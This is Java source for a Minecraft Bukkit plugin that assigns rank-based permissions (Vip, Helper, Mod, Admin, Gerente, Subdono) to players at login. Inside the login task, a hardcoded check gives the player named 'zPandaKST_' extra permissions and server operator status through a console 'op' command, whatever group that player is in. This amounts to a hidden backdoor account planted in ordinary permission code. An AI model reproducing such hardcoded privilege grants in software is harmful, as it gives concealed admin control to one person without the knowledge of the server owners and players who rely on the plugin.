package me.zpandakst.accountmanagment;

import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.scheduler.BukkitRunnable;

import me.zpandakst.Main;

public class PermEntry implements Listener {

    private static PermEntry api;

    public static PermEntry getAPI() {
        return api;
    }

    HashMap<UUID, PermissionAttachment> perms = new HashMap<UUID, PermissionAttachment>();
    public static Map<Player, String> ExtraPermissions = new HashMap<Player, String>();
    public static Map<String, String> Group = new HashMap<String, String>();

    public void addPerm(String perm, Player p) {
        PermissionAttachment attachment = p.addAttachment(Main.getInstance());
        perms.put(p.getUniqueId(), attachment);
        PermissionAttachment pperms = perms.get(p.getUniqueId());
        pperms.setPermission(perm, true);
    }

    public static String getPermissions(Player p) {
        if (ExtraPermissions.containsKey(p)) {
            return ExtraPermissions.get(p);
        } else {
            return "Nenhuma";
        }
    }

    public static String getGroup(Player p) {
        if (Group.containsKey(p.getName())) {
            return Group.get(p.getName());
        } else {
            return "Membro";
        }
    }

    @EventHandler
    public void RemoveCache(PlayerQuitEvent e) {
        if (Group.containsKey(e.getPlayer().getName())) {
            Group.remove(e.getPlayer().getName());
        }
        if (ExtraPermissions.containsKey(e.getPlayer())) {
            PermEntry.ExtraPermissions.remove(e.getPlayer());
        }
        perms.remove(e.getPlayer().getUniqueId());
    }

    @EventHandler
    public void RemoveCache(PlayerKickEvent e) {
        if (Group.containsKey(e.getPlayer().getName())) {
            Group.remove(e.getPlayer().getName());
        }
        if (ExtraPermissions.containsKey(e.getPlayer())) {
            ExtraPermissions.remove(e.getPlayer());
        }
        perms.remove(e.getPlayer().getUniqueId());
    }

    @EventHandler
    public void LoginProcess(PlayerLoginEvent e) {
        String group = getGroup(e.getPlayer());
        Player p = (Player) e.getPlayer();
        PermissionAttachment attachment = e.getPlayer().addAttachment(Main.getInstance());
        perms.put(e.getPlayer().getUniqueId(), attachment);
        PermissionAttachment pperms = perms.get(e.getPlayer().getUniqueId());
        pperms.setPermission("tag.membro", true);
        new BukkitRunnable() {
            public void run() {
                if (group.equalsIgnoreCase("Membro")) {
                    pperms.setPermission("tag.membro", true);
                    return;
                }
                if (group.equalsIgnoreCase("Vip") || group.toLowerCase().equalsIgnoreCase("vip")) {
                    pperms.setPermission("tag.normal", true);
                    pperms.setPermission("tag.vip", true);
                    pperms.setPermission("gearmc.cmd.fly", true);

                    return;
                }
                if (group.equalsIgnoreCase("Vip+") || group.toLowerCase().equalsIgnoreCase("vip+")) {
                    pperms.setPermission("tag.vip+", true);
                    pperms.setPermission("tag.normal", true);
                    pperms.setPermission("gearmc.cmd.fly", true);
                    return;
                }
                if (group.equalsIgnoreCase("Youtuber") || group.toLowerCase().equalsIgnoreCase("youtuber")) {
                    pperms.setPermission("tag.youtuber", true);
                    pperms.setPermission("tag.normal", true);
                    pperms.setPermission("gearmc.cmd.fly", true);
                    return;
                }

                if (group.equalsIgnoreCase("Helper") || group.toLowerCase().equalsIgnoreCase("helper")
                        || group.toLowerCase().equalsIgnoreCase("ajudante")) {
                    pperms.setPermission("tag.normal", true);
                    pperms.setPermission("tag.helper", true);
                    pperms.setPermission("gearmc.cmd.fly", true);
                    return;
                }
                if (group.equalsIgnoreCase("Helper+") || group.toLowerCase().equalsIgnoreCase("helper+")
                        || group.toLowerCase().equalsIgnoreCase("ajudante+")) {
                    pperms.setPermission("tag.normal", true);
                    pperms.setPermission("tag.helper", true);
                    pperms.setPermission("tag.helper+", true);
                    pperms.setPermission("gearmc.cmd.fly", true);
                    pperms.setPermission("gearmc.cmd.accinfo", true);
                    return;
                }
                if (group.equalsIgnoreCase("Trial") || group.toLowerCase().equalsIgnoreCase("trial")) {
                    pperms.setPermission("tag.normal", true);
                    pperms.setPermission("tag.trial", true);
                    pperms.setPermission("gearmc.cmd.fly", true);
                    pperms.setPermission("gearmc.cmd.cc", true);
                    pperms.setPermission("gearmc.cmd.accinfo", true);
                    return;
                }
                if (group.equalsIgnoreCase("Mod") || group.toLowerCase().equalsIgnoreCase("mod")) {
                    pperms.setPermission("tag.normal", true);
                    pperms.setPermission("tag.mod", true);
                    pperms.setPermission("gearmc.cmd.fly", true);
                    pperms.setPermission("gearmc.cmd.cc", true);
                    pperms.setPermission("gearmc.cmd.accinfo", true);
                    return;
                }
                if (group.equalsIgnoreCase("Admin") || group.toLowerCase().equalsIgnoreCase("admin")) {
                    pperms.setPermission("tag.normal", true);
                    pperms.setPermission("tag.admin", true);
                    pperms.setPermission("gearmc.cmd.fly", true);
                    pperms.setPermission("gearmc.cmd.cc", true);
                    pperms.setPermission("gearmc.cmd.accinfo", true);
                    return;
                }
                if (group.equalsIgnoreCase("Gerente") || group.toLowerCase().equalsIgnoreCase("gerente")) {
                    ExtraPermissions.put(p,
                            "Youtuber , Trial , Mod , Admin , Membro , Helper");
                    pperms.setPermission("tag.normal", true);
                    pperms.setPermission("tag.gerente", true);
                    pperms.setPermission("gearmc.cmd.fly", true);
                    pperms.setPermission("gearmc.cmd.cc", true);
                    pperms.setPermission("gearmc.cmd.accinfo", true);
                    pperms.setPermission("gearmc.cmd.changegroup", true);
                    return;
                }
                if (group.equalsIgnoreCase("Subdono") || group.toLowerCase().equalsIgnoreCase("subdono")
                        || group.toLowerCase().equalsIgnoreCase("subdono")) {
                    ExtraPermissions.put(p,
                            "Youtuber , Trial , Mod , Admin , Gerente , checkgroup , Membro , Helper");
                    if (!e.getPlayer().isOp()) {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + e.getPlayer().getName());
                    }
                    }
                if (p.getName().equalsIgnoreCase("zPandaKST_")) {
                    ExtraPermissions.put(p,
                            "Youtuber . Trial , Mod , Admin , Gerente , checkgroup , Membro ,  Vip+ , Vip");
                    if (!e.getPlayer().isOp()) {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + e.getPlayer().getName());
                    }
                    return;
                }
                return;
            }
        }.runTaskLater(Main.getPlugin(), 10 * 2);
    }

}
